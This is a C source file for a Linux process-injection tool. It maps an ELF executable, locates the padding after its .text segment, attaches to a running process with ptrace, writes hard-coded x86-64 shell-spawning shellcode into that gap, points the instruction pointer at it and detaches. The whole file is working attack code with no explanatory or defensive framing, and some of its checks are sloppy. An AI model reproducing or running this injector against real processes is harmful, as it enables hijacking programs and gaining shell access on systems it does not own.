#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/user.h>
#include <sys/reg.h>
#include <errno.h>
#include <elf.h>
#include <sys/mman.h>
#include <fcntl.h>


#define SHELLCODE_SIZE 32

/* Spawn a shell */
unsigned char *shellcode =
  "\x48\x31\xc0\x48\x89\xc2\x48\x89"
  "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
  "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
  "\x2f\x73\x68\x00\xcc\x90\x90\x90";

int
inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  /* Inject code at the start of the padding bytes */
  for (i = 0; i < len; i+=4, s++, d++)
  {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
      {
	       perror ("PTRACE_POKETEXT:");
	       return -1;
      }
  }

  return 0;
}

int
main (int argc, char *argv[])
{
  pid_t                   target_pid;
  struct user_regs_struct regs;
  int                     fd, i, gap;
  int                     *text_end_addr;
  int                     text_end;
  uint8_t                 *data;
  struct                  stat st;
  Elf64_Ehdr              *ehdr;
  Elf64_Phdr              *phdr;
  Elf64_Shdr              *shdr;

  if (argc != 3)
  {
      fprintf (stderr, "Usage:\t%s <exectuable> <pid>\n", argv[0]);
      exit (1);
  }

  /* Open the binary */
  if ( (fd = open(argv[1], O_RDONLY)) < 0) {
      perror("open");
      exit(-1);
  }

  /* Get its size */
  if (fstat(fd, &st) < 0) {
      perror("fstat");
      exit(-1);
  }

  /* Map the executable in memory */
  data = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
  if(data == MAP_FAILED) {
      perror("mmap");
      exit(-1);
  }

  ehdr = (Elf64_Ehdr *)data;
  phdr = (Elf64_Phdr *)(data + ehdr->e_phoff);

  /* Check if the file is of type ELF */
  if ( data[0] != 0x7f && strcmp(&data[1], "ELF") ) {
      fprintf(stderr,"%s is not an ELF file.\n", argv[1]);
      exit(-1);
  }

  /* Check if the ELF file is of type ET_EXEC */
  if(ehdr->e_type != ET_EXEC) {
      fprintf(stderr, "%s is not an exectuable\n", argv[1]);
      exit(-1);
  }

  printf("[+] Entry point @ 0x%x\n", ehdr->e_entry);

  printf("\n~ Program Headers ~\n\n");

  /*
        --------------
        | ELF Header |
        --------------
        | Phdr Table |
        --------------  <--- Beginning of Program Headers
        |   .text    |
        --------------
        |  (.ro)data |
        --------------
  */

  for(i = 0; i < ehdr->e_phnum; i++)
  {
      if (phdr[i].p_type == PT_LOAD) {

              /* The .text segment is always at offset 0 */
              if(phdr[i].p_offset == 0) {
                  printf("[+] LOAD segment @ 0x%x\n", phdr[i].p_vaddr);
                  text_end_addr = (int *)(phdr[i].p_vaddr + phdr[i].p_filesz);
                  text_end = phdr[i].p_offset + phdr[i].p_filesz;
              }

              else {
                  /* The 2nd LOAD segment is usually the .data segment */
                  printf("[+] LOAD segment @ 0x%x\n", phdr[i].p_vaddr);
                  gap = phdr[i].p_offset - text_end;
              }
      }
  }

  printf ("[+] .text segment gap starting @ offset 0x%x\n[+] %d bytes available for shellcode\n", text_end, gap);

  target_pid = atoi (argv[2]);
  printf ("\n\n[+] Tracing process %d\n", target_pid);

  if ((ptrace (PTRACE_ATTACH, target_pid, NULL, NULL)) < 0)
  {
      perror ("PTRACE_ATTACH:");
      exit (1);
  }

  printf ("[+] Waiting for process...\n");

  /* Waiting for a SIGTRAP signal */
  wait (NULL);

  /* Get the value of the registers */
  printf ("[+] Reading Registers...\n");
  if ((ptrace (PTRACE_GETREGS, target_pid, NULL, &regs)) < 0)
  {
    perror ("PTRACE_GETREGS:");
    exit (1);
  }

  /* Inject code into current RIP position */
  printf ("[+] Injecting shellcode @ address %p\n", text_end_addr);
  inject_data (target_pid, shellcode, (void*)text_end_addr, SHELLCODE_SIZE);

  regs.rip = (long)text_end_addr;
  regs.rip += 2;

  printf ("[+] Setting instruction pointer to %p\n", (void*)regs.rip);

  /* Set registers so that RIP points to the shellcode */
  if ((ptrace (PTRACE_SETREGS, target_pid, NULL, &regs)) < 0)
  {
      perror ("PTRACE_SETREGS:");
      exit (1);
  }

  if ((ptrace (PTRACE_DETACH, target_pid, NULL, NULL)) < 0)
  {
	  perror ("PTRACE_DETACH:");
	  exit (1);
  }

  close(fd);
  return 0;

}
